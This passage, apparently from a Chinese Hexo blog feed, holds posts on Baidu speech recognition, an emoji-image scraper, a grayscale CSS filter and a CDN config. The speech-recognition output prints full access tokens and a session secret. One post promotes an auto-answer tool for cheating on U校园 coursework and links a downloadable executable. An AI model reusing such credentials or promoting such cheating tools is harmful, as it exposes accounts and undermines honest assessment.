class="hljs-keyword">except</span> URLError <span class="hljs-keyword">as</span> err:<br>        print(<span class="hljs-string">&#x27;asr http response http code : &#x27;</span> + <span class="hljs-built_in">str</span>(err.code))<br>        result_str = err.read()<br><br>    <span class="hljs-keyword">if</span> (IS_PY3):<br>        result_str = <span class="hljs-built_in">str</span>(result_str, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    print(result_str)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> of:<br>        of.write(result_str)<br></code></pre></td></tr></table></figure><h1 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h1><p>我们运行程序后或返回一下信息</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<span class="hljs-string">&quot;access_token&quot;</span>:<span class="hljs-string">&quot;24.0ed58d5f890b6388b8e1fbb4f595e64e.2592000.1589017415.282335-19345000&quot;</span>,<span class="hljs-string">&quot;session_key&quot;</span>:<span class="hljs-string">&quot;9mzdC33+ru+xjYD0Bs+vqaaCurlrknFs75w6pvM+ddSFc9hWFqSn0t8aW8gWU7qWGl21RSTcM4A1bevZRf5m2labdgfjvA==&quot;</span>,<span class="hljs-string">&quot;scope&quot;</span>:<span class="hljs-string">&quot;audio_voice_assistant_get brain_enhanced_asr audio_tts_post public brain_all_scope picchain_test_picchain_api_scope wise_adapt lebo_resource_base lightservice_public hetu_basic lightcms_map_poi kaidian_kaidian ApsMisTest_Test\u6743\u9650 vis-classify_flower lpq_\u5f00\u653e cop_helloScope ApsMis_fangdi_permission smartapp_snsapi_base iop_autocar oauth_tp_app smartapp_smart_game_openapi oauth_sessionkey smartapp_swanid_verify smartapp_opensource_openapi smartapp_opensource_recapi qatest_scope1 fake_face_detect_\u5f00\u653eScope vis-ocr_\u865a\u62df\u4eba\u7269\u52a9\u7406 idl-video_\u865a\u62df\u4eba\u7269\u52a9\u7406&quot;</span>,<span class="hljs-string">&quot;refresh_token&quot;</span>:<span class="hljs-string">&quot;25.ccc2be055d9e6273d3c0bad9b8bb2368.315360000.1901785415.282335-19345000&quot;</span>,<span class="hljs-string">&quot;session_secret&quot;</span>:<span class="hljs-string">&quot;a0a53e0d2183b7145217373b71784075&quot;</span>,<span class="hljs-string">&quot;expires_in&quot;</span>:<span class="hljs-number">2592000</span>&#125;<br>&#123;&#x27;access_token&#x27;: &#x27;24.0ed58d5f890b<span class="hljs-number">6388</span>b8e1fbb4f595e64e.<span class="hljs-number">259200</span>0.<span class="hljs-number">1589017415.2823</span>35-<span class="hljs-number">19345000</span>&#x27;, &#x27;session_key&#x27;: &#x27;9mzdC33+ru+xjYD0Bs+vqaaCurlrknFs75w6pvM+ddSFc9hWFqSn0t8aW8gWU7qWGl21RSTcM4A1bevZRf5m2labdgfjvA==&#x27;, &#x27;scope&#x27;: &#x27;audio_voice_assistant_get brain_enhanced_asr audio_tts_post public brain_all_scope picchain_test_picchain_api_scope wise_adapt lebo_resource_base lightservice_public hetu_basic lightcms_map_poi kaidian_kaidian ApsMisTest_Test权限 vis-classify_flower lpq_开放 cop_helloScope ApsMis_fangdi_permission smartapp_snsapi_base iop_autocar oauth_tp_app smartapp_smart_game_openapi oauth_sessionkey smartapp_swanid_verify smartapp_opensource_openapi smartapp_opensource_recapi qatest_scope1 fake_face_detect_开放Scope vis-ocr_虚拟人物助理 idl-video_虚拟人物助理&#x27;, &#x27;refresh_token&#x27;: &#x27;25.ccc2be055d9e<span class="hljs-number">6273</span>d3c0bad9b8bb<span class="hljs-number">2368.31536000</span>0.<span class="hljs-number">1901785415.2823</span>35-<span class="hljs-number">19345000</span>&#x27;, &#x27;session_secret&#x27;: &#x27;a0a53e0d<span class="hljs-number">2183</span>b<span class="hljs-number">7145217373</span>b<span class="hljs-number">71784075</span>&#x27;, &#x27;expires_in&#x27;: <span class="hljs-number">2592000</span>&#125;<br>audio_voice_assistant_get<br>SUCCESS WITH TOKEN: <span class="hljs-number">24.0</span>ed58d5f890b6388b8e1fbb4f595e64e.<span class="hljs-number">2592000.1589017415</span>.<span class="hljs-number">282335</span>-<span class="hljs-number">19345000</span>  EXPIRES IN SECONDS: <span class="hljs-number">2592000</span><br>Request time cost <span class="hljs-number">1.736482</span><br>&#123;<span class="hljs-string">&quot;corpus_no&quot;</span>:<span class="hljs-string">&quot;6813645276203395866&quot;</span>,<span class="hljs-string">&quot;err_msg&quot;</span>:<span class="hljs-string">&quot;success.&quot;</span>,<span class="hljs-string">&quot;err_no&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;result&quot;</span>:[<span class="hljs-string">&quot;Beijing Cody girl&quot;</span>],<span class="hljs-string">&quot;sn&quot;</span>:<span class="hljs-string">&quot;487908489041586425415&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/H119a0599495846b8aaf1762ffbe78a6aV.png" srcset="/img/loading.gif" lazyload alt="8"><br>“result”:[“Beijing Cody girl”]中的内容就是识别的内容，在程序根目录也会生成result.txt文件也可以查看。</p></li></ul><p>ok，大概就是这个样子，我要去研究pcm这个鬼东西了。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>表情包太少？利用Python爬取表情包</title>
    <link href="/2020/04/32.html"/>
    <url>/2020/04/32.html</url>
    
    <content type="html"><![CDATA[<p>前言：代码实现了下载动态 下载静态的识别！<br>当然代码还有很多需要完善的 比如下载完的弹窗 bug也有比如创建空文件夹  只能爬取带ID固定的地址栏的表情包等等<br>简简单单凑合用！</p><a id="more"></a><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-built_in">import</span> requests<br>from bs4 <span class="hljs-built_in">import</span> BeautifulSoup<br><span class="hljs-built_in">import</span> webbrowser<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br>from tkinter <span class="hljs-built_in">import</span> *<br><span class="hljs-built_in">import</span> os<br> <br><span class="hljs-comment">#下载并返回值网页源码的类</span><br>def download_all_htmls(id):<br>    <span class="hljs-comment">#下载页面的HTML，用于分析</span><br>    <span class="hljs-attr">url</span> = f<span class="hljs-string">&quot;https://www.fabiaoqing.com/bqb/detail/id/&quot;</span>+id+<span class="hljs-string">&quot;.html&quot;</span><br>    <span class="hljs-comment">#读取网页</span><br>    <span class="hljs-attr">r</span> = requests.get(url)<br>    <span class="hljs-comment">#获取它的全部源码并text 并返回</span><br>    <span class="hljs-attr">txtc</span> = r.text<br>    return txtc<br> <br> <br> <br><span class="hljs-comment">#先分析标签中的文件名      再将二进制流，名称，格式 并在各自的列表中进行追加</span><br>def parse_single_html(html):<br>    <span class="hljs-comment">#解析HTML，得到数据</span><br>    <span class="hljs-comment">#[url=home.php?mod=space&amp;uid=155549]@Return[/url] list((img_title, img_url))</span><br>    <span class="hljs-attr">soup</span> = BeautifulSoup(html,<span class="hljs-string">&quot;html.parser&quot;</span>)<br>    <span class="hljs-comment">#声明一个文件名的函数 用网页的title标签作为文件名</span><br>    global wenjian <span class="hljs-comment">#声明为全局 方便下载时访问路劲</span><br>    <span class="hljs-attr">wenjian</span> = soup.find(&#x27;title&#x27;).get_text()<span class="hljs-comment">#查找title标签 并提取其中的内容</span><br>    os.mkdir(wenjian)<span class="hljs-comment">#调用文件操作 在当前文件下创建文件</span><br>    <span class="hljs-comment">#查找所有的图片的标签</span><br>    <span class="hljs-attr">img_divs</span> = soup.find_all(<span class="hljs-string">&quot;div&quot;</span>, <span class="hljs-attr">class_=&quot;bqppdiv1&quot;)</span><br>     <br>    global datas  <span class="hljs-comment"># 二进制流的列表</span><br>    <span class="hljs-attr">datas</span> = []<br>    global names<br>    <span class="hljs-attr">names</span> = []  <span class="hljs-comment"># 对应名字的列表</span><br>    global geshi<br>    <span class="hljs-attr">geshi</span> = []<span class="hljs-comment"># 对应后缀名的列表</span><br> <br>    <span class="hljs-comment">#循环查找</span><br>    for img_div <span class="hljs-keyword">in</span> img_divs:<br>        <span class="hljs-attr">img_node</span> = img_div.find(<span class="hljs-string">&quot;img&quot;</span>)<br>        <span class="hljs-keyword">if</span> not img_node: continue<br> <br>        <span class="hljs-comment">#增加到二次流的列表里</span><br>        <span class="hljs-attr">liu</span> = img_node[<span class="hljs-string">&quot;data-original&quot;</span>]<br>        datas.append(liu)<br>        <span class="hljs-comment"># 增加到格式的列表里</span><br>        <span class="hljs-attr">num=len(liu)</span><br>        geshi.append(liu[num-<span class="hljs-number">4</span>:])<br>        <span class="hljs-comment">#增加到对应的文件名的列表里</span><br>        names.append(img_node[<span class="hljs-string">&quot;alt&quot;</span>])<br><span class="hljs-comment">#调用下载的类 并将它的返回 作为参数 再调用分析和生成列表的类</span><br> <br> <br><span class="hljs-comment">#获取一下的长度</span><br> <br> <br> <br>def gif():<br>    <span class="hljs-comment">#调用获取网页源码和  再对源码处理成有图片名称 格式 二进制流的列表 两个类</span><br> <br> <br>    parse_single_html(download_all_htmls(entry1.get()))<br>    <span class="hljs-comment">#提前知道一下我需要下载多少张照片 也就是循环多次</span><br>    <span class="hljs-attr">lens</span> = len(datas)<br>    for i <span class="hljs-keyword">in</span> range(lens):<br> <br>        <span class="hljs-attr">reponse</span> = requests.get(datas[i])<br>        <span class="hljs-comment"># 获取网络图片二进制流</span><br>        <span class="hljs-attr">img_content</span> = reponse.content<br> <br>        <span class="hljs-comment"># 将二进制流保存到一个图片文件中就可以了</span><br>        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&quot;./&quot;</span>+wenjian+<span class="hljs-string">&quot;/&quot;</span>+names[i]+geshi[i], <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>            f.write(img_content)<br> <br><span class="hljs-comment">#打开链接</span><br>def open_url(event):<br>    webbrowser.open(<span class="hljs-string">&quot;https://www.fabiaoqing.com&quot;</span>, <span class="hljs-attr">new=0)</span><br> <br> <br> <br> <br><span class="hljs-comment">#窗体的声明</span><br>def window():<br>    <span class="hljs-comment"># 生成root主窗口</span><br>    <span class="hljs-attr">root=Tk(className</span> = <span class="hljs-string">&quot;表情包下载器&quot;</span>)<br>    <span class="hljs-comment"># 指定主框体大小</span><br>    root.geometry(&#x27;<span class="hljs-number">620</span>x440&#x27;)<br>    <span class="hljs-comment"># 框体大小可调性，分别表示x,y方向的可变性；</span><br>    root.resizable(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 生成提示标签</span><br>    <span class="hljs-attr">labe1=Label(root,text</span> = &#x27;欢迎来到表情包下载器&#x27;,<span class="hljs-attr">fg</span> = <span class="hljs-string">&quot;Olive&quot;</span>,<span class="hljs-attr">font</span> = <span class="hljs-string">&quot;宋体 -25 bold&quot;</span>,<span class="hljs-attr">background</span> = <span class="hljs-string">&quot;LightPink&quot;</span>, <span class="hljs-attr">height=2)</span><br>    labe1.pack()<br>    <span class="hljs-attr">labe2=Label(root,text</span> = &#x27;表情包来源：https://www.fabiaoqing.com&#x27;,<span class="hljs-attr">fg</span> = <span class="hljs-string">&quot;Olive&quot;</span>,<span class="hljs-attr">font</span> = <span class="hljs-string">&quot;宋体 -25 bold&quot;</span>,<span class="hljs-attr">background</span> = <span class="hljs-string">&quot;LightPink&quot;</span>)<br>    labe2.pack()<br>    <span class="hljs-attr">button2</span> = Button(root,<span class="hljs-attr">text</span> = &#x27;打开表情包主页&#x27;,<span class="hljs-attr">fg</span> = <span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-attr">font</span> = &#x27;宋体 -<span class="hljs-number">30</span> bold&#x27;,<span class="hljs-attr">width=20,command</span> = lambda : open_url(<span class="hljs-string">&quot;&lt;Button-1&gt;&quot;</span>))<span class="hljs-comment">#command = lambda :</span><br>    button2.pack()<br>    <span class="hljs-comment">#button2.bind(&quot;&lt;Button-1&gt;&quot;, open_url)</span><br> <br>    <span class="hljs-attr">labe3=Label(root,text</span> = &#x27;请在先在下方输入需要的表情包的地址&#x27;,<span class="hljs-attr">fg</span> = <span class="hljs-string">&quot;Olive&quot;</span>,<span class="hljs-attr">font</span> = <span class="hljs-string">&quot;宋体 -25 bold&quot;</span>,<span class="hljs-attr">background</span> = <span class="hljs-string">&quot;LightPink&quot;</span>)<br>    labe3.place(<span class="hljs-attr">x=90,y=200)</span><br> <br>    <span class="hljs-comment">#单行文本框让用户输入表情包ID</span><br>    <span class="hljs-comment"># 声明为全局变量可以访问</span><br>    global entry1<br>    <span class="hljs-attr">entry1=Entry(root,fg</span> = <span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-attr">font</span> = &#x27;宋体 -<span class="hljs-number">30</span> bold&#x27;,<span class="hljs-attr">width=10)</span><br>    entry1.place(<span class="hljs-attr">x=230,</span> <span class="hljs-attr">y=230)</span><br>    <span class="hljs-comment">#单击按钮后调用下载表情包的类并开始下载</span><br>    <span class="hljs-attr">button2</span> = Button(root,<span class="hljs-attr">text</span> = &#x27;下载文件请点击&#x27;,<span class="hljs-attr">fg</span> = <span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-attr">font</span> = &#x27;宋体 -<span class="hljs-number">30</span> bold&#x27;,<span class="hljs-attr">command</span> = lambda :gif(),<span class="hljs-attr">width=20,</span> <span class="hljs-attr">height=2)#command</span> = lambda :<br>    button2.place(<span class="hljs-attr">x=140,</span> <span class="hljs-attr">y=300)</span><br> <br>    <span class="hljs-comment"># 进入消息循环（必需组件）</span><br>    root.mainloop()<br> <br> <br>window()<span class="hljs-comment">#整个程序的调用！</span><br></code></pre></td></tr></table></figure><p>程序封装成.exe方法<br>需要用 pip 安装一个  pyinstaller 模块<br>【详细安装可自查百度】<br>第一步准备一个 .ico格式 的图标 和.py 文件<br>复制你准备好的两个文件放入自己安装的 pyinstaller的目录中；</p><p>第二步<br>复制你的  pyinstaller.exe的路径<br>在win+r 输入 cmd<br>在cmd命令窗口输入 cd 右键粘贴你的路径 回车</p><p>第三步（注图标必须为ico格式）<br>输入你的命令<br>pyinstaller -F py文件 -i 图标<br>第四步<br>pyinstaller的同级目录中会有个dist的文件夹<br>打开里面就有生成的exe文件</p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何一键灰白，以示哀思</title>
    <link href="/2020/04/31.html"/>
    <url>/2020/04/31.html</url>
    
    <content type="html"><![CDATA[<p>2020年4月4日</p><p>是农历庚子年的清明节</p><p>同样也是2000年以来的第四个全国追悼日</p><h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>2020年4月3日，国务院公告：2020年4月4日举行全国性哀悼活动。</p><p>4日零点，各大游戏停服维护，各个公司主页应用改为黑白主题。<br>4日10时全国降半旗鸣笛默哀，表达全国各族人民对抗击新冠肺炎疫情斗争牺牲烈士和逝世同胞的深切哀悼。<br>这也许是人生中第一次全网上下，身前身后都是一片灰色沉痛的基调。百度、腾讯新闻、今日头条、人民日报、淘宝等等你所能用到的app/官网，都将页面色调转为黑白，以示哀思。他们是怎么做到一夜之间将如此大体量的网页做了主题切换的呢？难道他们早就接到了通知？</p><p>其实不然，做到这些关键代码只有一行，其次再考虑下各浏览器版本兼容的问题就可以轻松做到：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>)<br></code></pre></td></tr></table></figure><p>这是一行css3的样式代码，意为将图像转换为灰度图像。值定义转换的比例。值为100%则完全转为灰度图像，值为0%图像无变化。值在0%到100%之间，则是效果的线性乘子。若未设置，值默认是0；<br>有了核心代码，再稍加修饰，让其兼容多版本浏览器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123; <br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&quot;data:image/svg+xml;utf8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;filter id=&quot;grayscale&quot;&gt;&lt;feColorMatrix type=&quot;matrix&quot; values=&quot;0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0&quot;/&gt;&lt;/filter&gt;&lt;/svg&gt;#grayscale&quot;</span>); <span class="hljs-comment">/* Firefox 3.5+ */</span><br>  -webkit-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>); <span class="hljs-comment">/* chrome+ */</span><br>  -moz-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);<br>  -ms-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);<br>  -o-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);<br>  <span class="hljs-attribute">filter</span>: gray; <span class="hljs-comment">/* ie6-8 */</span><br>  <span class="hljs-attribute">filter</span>: progid:DXImageTransform.Microsoft.<span class="hljs-built_in">BasicImage</span>(grayscale=<span class="hljs-number">1</span>);<span class="hljs-comment">/*ie6-9 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此段样式代码只需声明为全局样式，其样式文件在页面头部引入，即可生效。如有需要请自行食用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo利用CDN实现静态文件加速</title>
    <link href="/2020/04/30.html"/>
    <url>/2020/04/30.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近搞来搞去，还是把博客的主题换成了NexT，现在感觉还是这款主题用着舒服，简洁，功能还很丰富，不过由于本博客托管于github，毕竟是国外网站，在国内的速度<br>还是很感人的，更何况还需要加载好多的静态文件，所以我们为了提高页面的打开速度，我决定将第三方的静态文件全部改为从公用的CDN来获取，几天下来，博客的打开速度<br>确实提高了不少。下面把CDN的配置给大家，赶快去体验吧！！！！！！！！<br>这里只是针对第三方静态文件的加速，修改<code>Next</code>主题配置文件<code>_config.yml</code>如下：</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs awk">vendors:<br>  <span class="hljs-comment"># Internal path prefix. Please do not edit it.</span><br>  _internal: lib<br><br>  <span class="hljs-comment"># Internal version: 2.1.3</span><br>  jquery: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/jquery/</span><span class="hljs-number">2.1</span>.<span class="hljs-number">3</span>/jquery.min.js<br><br>  <span class="hljs-comment"># Internal version: 2.1.5</span><br>  <span class="hljs-comment"># See: http://fancyapps.com/fancybox/</span><br>  fancybox: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/fancybox/</span><span class="hljs-number">2.1</span>.<span class="hljs-number">5</span><span class="hljs-regexp">/jquery.fancybox.min.js # https:/</span><span class="hljs-regexp">/cdn.bootcss.com/</span>fancybox<span class="hljs-regexp">/2.1.5/</span>jquery.fancybox.pack.js<br>  fancybox_css: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/fancybox/</span><span class="hljs-number">2.1</span>.<span class="hljs-number">5</span>/jquery.fancybox.min.css<br><br>  <span class="hljs-comment"># Internal version: 1.0.6</span><br>  <span class="hljs-comment"># See: https://github.com/ftlabs/fastclick</span><br>  fastclick: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/fastclick/</span><span class="hljs-number">1.0</span>.<span class="hljs-number">6</span>/fastclick.min.js<br><br>  <span class="hljs-comment"># Internal version: 1.9.7</span><br>  <span class="hljs-comment"># See: https://github.com/tuupola/jquery_lazyload</span><br>  lazyload: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/jquery_lazyload/</span><span class="hljs-number">1.9</span>.<span class="hljs-number">7</span>/jquery.lazyload.min.js<br><br>  <span class="hljs-comment"># Internal version: 1.2.1</span><br>  <span class="hljs-comment"># See: http://VelocityJS.org</span><br>  velocity: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/velocity/</span><span class="hljs-number">1.2</span>.<span class="hljs-number">1</span>/velocity.min.js<br><br>  <span class="hljs-comment"># Internal version: 1.2.1</span><br>  <span class="hljs-comment"># See: http://VelocityJS.org</span><br>  velocity_ui: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/velocity/</span><span class="hljs-number">1.2</span>.<span class="hljs-number">1</span>/velocity.ui.min.js<br><br>  <span class="hljs-comment"># Internal version: 0.7.9</span><br>  <span class="hljs-comment"># See: https://faisalman.github.io/ua-parser-js/</span><br>  ua_parser:<br><br>  <span class="hljs-comment"># Internal version: 4.6.2</span><br>  <span class="hljs-comment"># See: http://fontawesome.io/</span><br>  fontawesome: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/font-awesome/</span><span class="hljs-number">4.6</span>.<span class="hljs-number">2</span><span class="hljs-regexp">/css/</span>font-awesome.min.css<br><br>  <span class="hljs-comment"># Internal version: 1</span><br>  <span class="hljs-comment"># https://www.algolia.com</span><br>  algolia_instant_js:<br>  algolia_instant_css:<br><br>  <span class="hljs-comment"># Internal version: 1.0.2</span><br>  <span class="hljs-comment"># See: https://github.com/HubSpot/pace</span><br>  <span class="hljs-comment"># Or use direct links below:</span><br>  <span class="hljs-comment"># pace: //cdn.bootcss.com/pace/1.0.2/pace.min.js</span><br>  <span class="hljs-comment"># pace_css: //cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css</span><br>  pace: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/pace/</span><span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>/pace.min.js<br>  pace_css: https:<span class="hljs-regexp">//</span>cdn.bootcss.com<span class="hljs-regexp">/pace/</span><span class="hljs-number">1.0</span>.<span class="hljs-number">2</span><span class="hljs-regexp">/themes/</span>blue/pace-theme-flash.min.css<br></code></pre></td></tr></table></figure><p>针对自定义的静态文件(main.min.js和main.min.css)需要自行使用融合CDN，国内都需要备案域名.</p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>U校园刷课半自动化解决方案</title>
    <link href="/2020/03/29.html"/>
    <url>/2020/03/29.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>学习使人快乐，技术使人懒惰。秉持着雷锋精神，为了服务爱学(tou)习(lan)的大学生，今天就来分享下U校园的刷课半自动化解决方案。怎么说呢，也不算方案吧，也就是个工具。</p></blockquote><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>利用脚本+题库实现自动搜答案，自动填空</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>1.可以上网的电脑（注意下，这里要固定ip地址的，不要开加速器哦，不然U校园的垃圾判断机制会限制你登陆哦，一般家用宽带都是固定ip的）<br>2.下载本文提供的集成浏览器，下载地址：<a href="https://www.lanzous.com/iaqd8pc">https://www.lanzous.com/iaqd8pc</a><br>3.没有解压软件推荐用7-zip,下载地址：<a href="https://sparanoid.com/lab/7z/">https://sparanoid.com/lab/7z/</a></p><h1 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h1><p>1.下载浏览器<br>2.解压缩<br>3.打开解压后的文件夹有<code>运行此文件.exe</code>,双击运行<br>4.如图，点击箭头所指链接<br><img src="https://s1.ax1x.com/2020/03/28/Gkge1J.png" srcset="/img/loading.gif" lazyload alt="1"><br>5.登陆U校园<br><img src="https://s1.ax1x.com/2020/03/28/GkgvE6.png" srcset="/img/loading.gif" lazyload alt="2"><br>6.进入课程，开始学习，遇到需要你回答的题目会出现下面类似的窗口<br><img src="https://s1.ax1x.com/2020/03/28/Gk2lKs.png" srcset="/img/loading.gif" lazyload alt="3"><br>等待它自动完成回答，完成后自己用鼠标去点一下回答的空。之后就可以提交了。</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>出现答题失败的可能原因：<br>1.该题型未适配<br>2.网页存在缓存，刷新网页即可<br>3.如有疑问，请反馈。</p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>使用脚本则同意以下规定<br>代码禁止二次开发<br>本软件按“原样”提供，不提供任何形式的明示或暗示担保，包括但不限于对适销性，特定目的的适用性和非侵权性的担保。无论是由于软件，使用或其他方式产生的，与之有关或与之有关的合同，侵权或其他形式的任何索赔，损害或其他责任，作者或版权所有者概不负责。</p><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><p>MrDgbot提供的脚本支持</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习之路（五）</title>
    <link href="/2020/03/28.html"/>
    <url>/2020/03/28.html</url>
    
